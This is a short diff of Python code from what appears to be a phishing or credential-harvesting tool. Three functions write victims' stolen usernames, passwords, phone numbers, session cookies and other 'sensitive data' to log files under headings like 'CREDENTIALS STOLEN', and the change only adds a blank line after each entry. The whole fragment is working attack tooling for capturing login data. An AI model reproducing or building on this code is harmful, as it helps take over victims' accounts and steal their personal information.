@@ -33,6 +33,7 @@ def save_stolen_credentials(login_flow: LoginFlow) -> None:
             f"CREDENTIALS STOLEN - Acquired at: {utc_now} (UTC)\n"
             f"Username: {username}\n"
             f"Password: {password}\n"
+            f"\n"
         )
 
         with file.open("a", encoding="utf-8") as f:
@@ -57,6 +58,7 @@ def save_stolen_phone_number(login_flow: LoginFlow) -> None:
         content = (
             f"PHONE NUMBER STOLEN - Acquired at: {utc_now} (UTC)\n"
             f"Phone Number: {phone_number}\n"
+            f"\n"
         )
 
         with file.open("a", encoding="utf-8") as f:
@@ -101,6 +103,7 @@ def save_stolen_data(login_flow: LoginFlow) -> None:
             f"Phone Number: {phone_number}\n"
             f"Cookies: {dumps(cookies, indent=4)}\n"
             f"Sensitive Data: {dumps(sensitive_data, indent=4)}\n"
+            f"\n"
         )
 
         with file.open("a", encoding="utf-8") as f:
